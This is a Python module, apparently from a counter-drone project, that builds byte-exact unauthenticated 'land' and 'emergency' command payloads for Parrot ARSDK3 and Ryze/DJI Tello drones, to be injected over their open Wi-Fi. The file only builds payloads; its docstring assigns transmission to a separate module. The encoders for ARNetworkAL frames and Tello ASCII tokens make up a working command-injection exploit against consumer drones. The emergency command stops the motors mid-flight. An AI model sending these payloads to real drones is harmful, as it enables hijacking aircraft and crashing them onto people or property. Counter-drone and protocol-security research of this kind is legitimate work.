#!/usr/bin/env python3
"""Command ENCODER for MEGHDUT C3 active Wi-Fi defeat (Phase 1b).

Builds the byte-exact payloads for a *targeted, unauthenticated* `land` /
`emergency` command against a cooperative, UNENCRYPTED airframe on its own
open Wi-Fi softAP. Two protocol families, kept strictly separate:

  1. Parrot ARSDK3 (Bebop/Bebop2/Disco/ANAFI generation) -- the binary
     ARNetworkAL frame + generic ARCommand (project/class/command) header.
     This module is the ENCODE inverse of `parrot_arsdk_decode_bridge.py` and
     REUSES that module's verified framing primitives (`_build_frame`,
     `_build_arcommand`) rather than re-deriving them.
  2. Ryze/DJI Tello -- a completely different, plaintext ASCII UDP "Tello
     SDK". NOT ARSDK3. Encoded here as the literal ASCII tokens the Tello
     accepts on 192.168.10.1:8889. Deliberately NOT conflated with ARSDK.

SCOPE / SAFETY INVARIANTS (this module):
  * PURE. Every public function returns bytes, or (bytes, dest_addr). There
    is NO socket, NO NIC, NO transmit path here -- transmission is
    `wifi_defeat_primitives.py`'s job under the governed safety spine. This
    module only BUILDS payload bytes.
  * It IMPORTS FROM the RX-only decoder to reuse its framing helpers. It does
    NOT modify the decoder and gives the decoder no transmit path; the
    decoder's RX-only invariant is untouched (we import its pure struct
    helpers; importing `parrot_arsdk_decode_bridge` has no side effects --
    its only runtime entry point is under `if __name__ == "__main__"`).

=============================================================================
HONESTY GATE -- COMMAND IDs ARE VERIFIED FROM SOURCE, NEVER ASSUMED
=============================================================================
Per the build contract (wifi-defeat-active-cuas-plan.md, mechanism 2), the
`ardrone3` Piloting Landing/Emergency command IDs are NOT present in this
repo and MUST be verified against the BSD-3-Clause `arsdk-xml` catalog and
cited, never guessed. Every ID below was read directly from the authoritative
XML / reference SDK source in this session (2026-09-05):

  Parrot ARSDK3 -- source: Parrot-Developers/arsdk-xml, `xml/ardrone3.xml`
  (BSD-3-Clause, Copyright (C) 2014 Parrot SA; same license verification as
  documented in parrot_arsdk_decode_bridge.py). Verbatim from that file:
      <project name="ardrone3" id="1">
        <class name="Piloting" id="0">
          <cmd name="Landing" id="3">                              # no <arg>
          <cmd name="Emergency" id="4" buffer="HIGH_PRIO"
               timeout="RETRY">                                     # no <arg>
  -> project ardrone3 = 1, class Piloting = 0, Landing = 3, Emergency = 4.
     Both are ZERO-argument commands (a <comment> follows each <cmd> tag
     directly; there is no <arg> element), so each ARCommand payload is
     exactly the 4-byte project/class/command header with no trailing args.
     (Context IDs also read from the same file and consistent with this
     class: TakeOff=1, PCMD=2, NavigateHome=5 -- not encoded here.)

  Ryze/DJI Tello -- source: the official Tello SDK 2.0 control-command set as
  implemented in dji-sdk/Tello-Python (`Tello_Video/tello.py`) and the widely
  used DJITelloPy library (`djitellopy/tello.py`), both read this session:
      SDK-enter token : b"command"    (must be sent once to enable SDK mode)
      land token      : b"land"
      emergency token : b"emergency"  (stop motors immediately)
      transport       : UDP to 192.168.10.1 : 8889, payload = the ASCII
                        token UTF-8 encoded with NO terminator.

  buffer / frame-type note (NOT honesty-critical, caller-overridable): the
  concrete ARNetworkAL buffer IDs (C2D_ACK=11, C2D_EMERGENCY=12) and the
  DATA_WITH_ACK frame type used as defaults below are the Parrot reference
  implementation's own default buffer configuration, mirrored from
  parrot_arsdk_decode_bridge.BUFFER_ID_NAMES; the XML `buffer="HIGH_PRIO"`
  attribute on Emergency is why it defaults onto the emergency buffer. The
  honesty-critical, verified-from-source part is the project/class/command ID
  triple; the buffer id / seq / frame type are runtime-transport parameters
  and are exposed as arguments.

Any command whose ID could NOT be verified from a citable source is NOT
emitted: it is registered as UNVERIFIED and the encoder RAISES
`UnverifiedCommandError` for it rather than fielding a guessed frame. In this
build both Landing and Emergency were verified, so nothing here is fielded
unverified -- but the refusal mechanism is enforced for any unknown or
explicitly-unverified command name.

Requires: only the Python standard library (struct) beyond the sibling
decoder module. No third-party dependency.
"""
from __future__ import annotations

import os
import struct
import sys
from dataclasses import dataclass
from typing import Dict, Optional, Tuple

# Reuse the VERIFIED framing primitives from the RX-only decoder (import only;
# the decoder is not modified and gains no transmit path). Ensure the sibling
# module resolves regardless of the caller's CWD. This mirrors the exact
# sibling-import pattern used elsewhere in field-bridge (e.g.
# parrot_arsdk_ingest_bridge.py, wifi_drone_bridge.py, remoteid_kismet_bridge.py
# all do the identical sys.path.insert(0, <this dir>) before a plain sibling
# `import`) — these modules are run as top-level scripts, not an installed
# package, so a package-relative import is not available here. Guarded against
# duplicate insertion (harmless but pointless on a re-import / repeated exec).
_HERE = os.path.dirname(os.path.abspath(__file__))
if _HERE not in sys.path:
    sys.path.insert(0, _HERE)
from parrot_arsdk_decode_bridge import (  # noqa: E402  (path insert must precede)
    _build_arcommand,
    _build_frame,
    FRAME_TYPE_DATA_WITH_ACK,
    PROJECT_ARDRONE3,
)

# ---------------------------------------------------------------------------
# ARSDK3 constants for the ardrone3 Piloting COMMAND class.
# PROJECT_ARDRONE3 (==1) is imported from the decoder. The Piloting *command*
# class id (0) is NOT defined in the decoder (which only decodes PilotingState,
# class 4); it is defined here, verified from ardrone3.xml (see module header).
# The concrete C2D buffer IDs mirror parrot_arsdk_decode_bridge.BUFFER_ID_NAMES.
# ---------------------------------------------------------------------------
CLASS_ARDRONE3_PILOTING = 0  # ardrone3.xml: <class name="Piloting" id="0">

C2D_ACK = 11         # controller->drone, ack-required buffer (BUFFER_ID_NAMES)
C2D_EMERGENCY = 12   # controller->drone, emergency/high-prio buffer

# Tello plaintext ASCII UDP SDK transport (official Tello SDK 2.0).
TELLO_IP = "192.168.10.1"
TELLO_CONTROL_PORT = 8889
TELLO_ADDR: Tuple[str, int] = (TELLO_IP, TELLO_CONTROL_PORT)


class UnverifiedCommandError(ValueError):
    """Raised when an encoder is asked for a command whose wire ID/token was
    NOT verified from a citable source. The encoder refuses rather than
    fielding a guessed frame. Honesty over completeness."""


class TelloCommandError(ValueError):
    """Raised for an unrecognized Tello ASCII SDK token."""


# ===========================================================================
# Parrot ARSDK3 encoders (inverse of parrot_arsdk_decode_bridge decoders)
# ===========================================================================
@dataclass(frozen=True)
class ArdronePilotingCommand:
    """One ardrone3 Piloting command. `command_id` is the verified
    arsdk-xml <cmd id=...> value; `verified` is False (and the encoder
    refuses) for any command whose ID was not confirmed from source."""
    xml_name: str
    command_id: Optional[int]
    default_buffer_id: int
    verified: bool
    citation: str


# Registry of ardrone3 Piloting commands this module can build. Only entries
# with verified=True and a non-None command_id are ever emitted.
ARDRONE3_PILOTING_COMMANDS: Dict[str, ArdronePilotingCommand] = {
    "land": ArdronePilotingCommand(
        xml_name="Landing",
        command_id=3,
        default_buffer_id=C2D_ACK,
        verified=True,
        citation=('arsdk-xml xml/ardrone3.xml: project ardrone3 id=1, '
                  'class Piloting id=0, <cmd name="Landing" id="3"> '
                  '(zero-argument; BSD-3-Clause)'),
    ),
    "emergency": ArdronePilotingCommand(
        xml_name="Emergency",
        command_id=4,
        default_buffer_id=C2D_EMERGENCY,
        verified=True,
        citation=('arsdk-xml xml/ardrone3.xml: project ardrone3 id=1, '
                  'class Piloting id=0, '
                  '<cmd name="Emergency" id="4" buffer="HIGH_PRIO" '
                  'timeout="RETRY"> (zero-argument; BSD-3-Clause)'),
    ),
}


def encode_ardrone3_piloting(
    command: str,
    *,
    seq: int = 0,
    buffer_id: Optional[int] = None,
    frame_type: int = FRAME_TYPE_DATA_WITH_ACK,
) -> bytes:
    """Build the byte-exact ARNetworkAL frame for an ardrone3 Piloting
    command an UNENCRYPTED Parrot would accept on its controller->drone
    buffer.

    Honesty gate: refuses (UnverifiedCommandError) any command not present in
    ARDRONE3_PILOTING_COMMANDS or flagged unverified -- never fields a guessed
    ID.

    Byte layout (total 11 bytes for both land and emergency, since both are
    zero-argument commands):
        ARNetworkAL header (7): type(u8) | buffer_id(u8) | seq(u8) |
                                total_size(u32 LE)
        ARCommand header   (4): project(u8=1) | class(u8=0) | command(u16 LE)
    e.g. emergency, seq=0 -> 04 0C 00 0B000000 01 00 0400

    `seq` is the per-buffer sequence number (a runtime counter on the wire;
    parameterized, default 0). `buffer_id`/`frame_type` default to the
    reference implementation's ack-required buffer for this command; override
    only with a verified transport reason.
    """
    spec = ARDRONE3_PILOTING_COMMANDS.get(command)
    if spec is None:
        raise UnverifiedCommandError(
            f"unverified command id -- do not field: ardrone3 Piloting "
            f"'{command}' is not a verified command in this encoder"
        )
    if not spec.verified or spec.command_id is None:
        raise UnverifiedCommandError(
            f"unverified command id -- do not field: ardrone3 Piloting "
            f"'{command}' ({spec.xml_name}) has no source-verified command id"
        )
    if not 0 <= seq <= 0xFF:
        raise ValueError(f"seq must be a single byte 0..255, got {seq}")

    buf = spec.default_buffer_id if buffer_id is None else buffer_id
    # Zero-argument command: ARCommand payload is just the 4-byte header.
    arcommand = _build_arcommand(
        PROJECT_ARDRONE3, CLASS_ARDRONE3_PILOTING, spec.command_id, b"")
    return _build_frame(frame_type, buf, seq, arcommand)


def encode_land(seq: int = 0, **kwargs) -> bytes:
    """ardrone3(1)/Piloting(0)/Landing(3), zero args. See module header."""
    return encode_ardrone3_piloting("land", seq=seq, **kwargs)


def encode_emergency(seq: int = 0, **kwargs) -> bytes:
    """ardrone3(1)/Piloting(0)/Emergency(4), zero args, emergency buffer."""
    return encode_ardrone3_piloting("emergency", seq=seq, **kwargs)


# ===========================================================================
# Ryze/DJI Tello encoders (plaintext ASCII UDP SDK -- NOT ARSDK3)
# ===========================================================================
# Verified Tello SDK 2.0 control tokens (see module header citations).
TELLO_TOKENS: Dict[str, bytes] = {
    "command": b"command",     # enter SDK mode (send once before others)
    "land": b"land",           # auto-land
    "emergency": b"emergency",  # stop motors immediately
}


def encode_tello(command: str) -> Tuple[bytes, Tuple[str, int]]:
    """Return (payload_bytes, dest_addr) for a Tello ASCII SDK command.

    Payload is the literal UTF-8 token with NO terminator, destined for the
    Tello control socket 192.168.10.1:8889. Raises TelloCommandError for an
    unrecognized token (never guesses a Tello command)."""
    token = TELLO_TOKENS.get(command)
    if token is None:
        raise TelloCommandError(
            f"unrecognized Tello SDK token '{command}'; "
            f"known: {sorted(TELLO_TOKENS)}"
        )
    return token, TELLO_ADDR


def tello_enter_sdk() -> Tuple[bytes, Tuple[str, int]]:
    """Tello 'command' -- enable SDK mode (prerequisite for land/emergency)."""
    return encode_tello("command")


def tello_land() -> Tuple[bytes, Tuple[str, int]]:
    """Tello 'land' -- auto-land."""
    return encode_tello("land")


def tello_emergency() -> Tuple[bytes, Tuple[str, int]]:
    """Tello 'emergency' -- stop motors immediately."""
    return encode_tello("emergency")
